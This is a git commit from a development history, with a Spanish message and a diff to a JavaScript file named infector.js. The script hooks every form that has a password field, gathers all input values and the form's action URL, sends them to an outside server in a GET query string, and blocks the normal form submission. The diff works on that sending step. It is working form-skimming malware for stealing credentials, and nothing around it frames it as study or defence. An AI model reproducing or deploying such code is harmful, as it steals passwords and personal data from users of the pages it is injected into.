52f5d9115929f4a75256a8f79ea8d90e8d823278
Matías Lang <shareman1204@gmail.com>
2013-01-16 14:30:10 -0300

    Ya se envían los datos, pero se queda colgado hasta recibir una respuesta

--- data/infector.js
+++ data/infector.js
@@ -11,7 +11,7 @@ for(i=0; i<campos.length; i++)
 {
 	//Con cada campo de password
 	form = campos[i].form;
-	form.addEventListener('submit', function(){
+	form.addEventListener('submit', function(e){
 		mensaje = 'URL: ' + this.action + '\n';
 		nodos = this.querySelectorAll('input');
 		for(j=0; j<nodos.length; j++)
@@ -24,19 +24,24 @@ for(i=0; i<campos.length; i++)
 			}
 		}
 		query = '?data=' + escape(mensaje);
-		// Insertamos una imagen a nuestro servidor, la URL contiene 
-		// campos del form con información sensible
-		//document.write('<iframe src="' + host + query + '">No soporto iframes</iframe>');
 
-		// Esperamos, para asegurarnos de que haya conexión antes de
-		// que se envíen los datos reales
-
-		if (window.XMLHttpRequest)
 		xmlhttp=new XMLHttpRequest();
-		console.log(host+query);
-		xmlhttp.open("GET", host+query, true);
+		xmlhttp.open("GET", host+query, false);
+		xmlhttp.onreadystate = function(){
+			console.log(xmlhttp.responseText);
+			console.log(xmlhttp.status);
+			//this.submit();
+		}
 		xmlhttp.send();
+		setTimeOut(function(){
+			xmlhttp.abort();
+		}, 1000);
+		console.log('listo');
 
-		sleep(timeout);
+		e.preventDefault();
+		/* setTimeOut(function(){
+			this.submit();
+		}, 5000); */
+
 		}, false)
 }
